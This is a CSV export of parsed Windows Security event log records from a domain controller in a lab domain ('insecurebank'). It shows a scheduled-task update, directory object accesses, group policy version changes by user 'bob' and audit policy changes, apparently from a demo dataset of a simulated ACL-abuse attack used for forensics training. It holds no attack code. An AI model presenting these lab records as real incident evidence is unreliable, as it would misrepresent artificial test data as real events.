RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
39,198238969,2019-03-25 12:22:45.3176056,4702,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A scheduled task was updated,insecurebank\DC1$,,TaskName: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask,"TaskContentNew: &lt;?xml version=""1.0"" encoding=""UTF-16""?&gt;, &lt;Task version=""1.4"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\system32\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T12:21:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=""NetworkService""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=""NetworkService""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""TaskName"",""#text"":""\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask""},{""@Name"":""TaskContentNew"",""#text"":""&lt;?xml version=\""1.0\"" encoding=\""UTF-16\""?&gt;, &lt;Task version=\""1.4\"" xmlns=\""http://schemas.microsoft.com/windows/2004/02/mit/task\""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\\system32\\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T12:21:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=\""NetworkService\""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=\""NetworkService\""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;""}]}}"
40,198239007,2019-03-25 12:31:35.1436348,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
41,198239009,2019-03-25 12:31:44.8106050,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,432,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""49a1e957-0b53-4119-9013-9bd2e846a68e""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65560""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
42,198239010,2019-03-25 12:31:44.8106050,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,4528,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""49a1e957-0b53-4119-9013-9bd2e846a68e""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65561""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
43,198239036,2019-03-25 12:33:36.0366438,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,432,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6cdecdb5-7515-4511-8141-c34a7c3d4a0a},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6cdecdb5-7515-4511-8141-c34a7c3d4a0a}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
44,198239043,2019-03-25 12:33:40.7146449,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6cdecdb5-7515-4511-8141-c34a7c3d4a0a},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6cdecdb5-7515-4511-8141-c34a7c3d4a0a}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
45,198239044,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""9ba86d72-7c57-4a9d-8239-e93d9ac25584""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""7""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
46,198239045,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""9ba86d72-7c57-4a9d-8239-e93d9ac25584""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""8""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
47,198239046,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""7a0ddd82-407e-41da-83b1-014a84297ab8""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""8""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
48,198239047,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""7a0ddd82-407e-41da-83b1-014a84297ab8""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""9""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
49,198239063,2019-03-25 12:33:59.2756130,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8279 SubcategoryId: %%14080,SubcategoryGuid: 0cce923b-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8451,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8279""},{""@Name"":""SubcategoryId"",""#text"":""%%14080""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce923b-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8451""}]}}"
50,198239064,2019-03-25 12:33:59.2756130,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8279 SubcategoryId: %%14081,SubcategoryGuid: 0cce923c-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8451,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8279""},{""@Name"":""SubcategoryId"",""#text"":""%%14081""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce923c-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8451""}]}}"
